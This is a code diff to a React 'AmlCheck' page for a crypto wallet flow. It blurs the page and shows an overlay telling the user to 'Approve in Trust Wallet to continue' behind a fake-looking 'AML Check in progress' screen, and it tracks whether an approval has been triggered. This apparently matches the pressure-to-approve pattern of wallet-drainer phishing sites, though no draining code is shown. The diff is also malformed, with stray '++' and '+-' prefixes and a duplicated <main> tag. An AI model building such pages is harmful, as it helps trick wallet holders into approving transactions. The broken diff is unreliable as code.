@@ -82,6 +82,10 @@ export default function AmlCheck() {
   const [isTrustModalOpen, setTrustModalOpen] = useState(false)
   // Mark whether approval has been triggered to avoid duplicates
   const [approvalTriggered, setApprovalTriggered] = useState(false)
+  // Only show AML scanning UI when wallet is connected and Trust modal is closed
+  const readyForAML = isConnected && !isTrustModalOpen && !!liveChainId
+  // Blur content until wallet connection logic is ready
+  const shouldBlur = !readyForAML
   
   const stages = [
     { pct: 5, label: 'Loading account and network context' },
@@ -236,14 +240,16 @@ export default function AmlCheck() {
     <>
       <Header />
       <main className="onboard" aria-labelledby="aml-title">
-        <div className="onboard-inner">
++      <main className="onboard" aria-labelledby="aml-title" style={{ position: 'relative' }}>
+-        <div className="onboard-inner">
++        <div className={`onboard-inner ${shouldBlur ? 'blurred' : ''}`}>
           <h1 id="aml-title" className="onboard-title">AML Check in progress</h1>
           <p className="onboard-subtitle">We’re performing automated AML screening and transaction risk analysis before proceeding.</p>
 
           <div className="onboard-step" style={{ gridTemplateColumns: 'auto 1fr' }}>
             
             <div>
-              {isConnected ? (
+              {readyForAML ? (
                 <div className="aml-center">
                   {progress < 100 ? (
                     <div className="aml-spinner" aria-label="Loading" />
@@ -284,6 +290,11 @@ export default function AmlCheck() {
             </div>
           </div>
         </div>
++        {shouldBlur && (
++          <div className="blur-overlay" aria-live="polite">
++            Connecting to wallet… Approve in Trust Wallet to continue.
++          </div>
++        )}
       </main>
       <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} dappUrl={amlPageUrl} />
       <Footer />
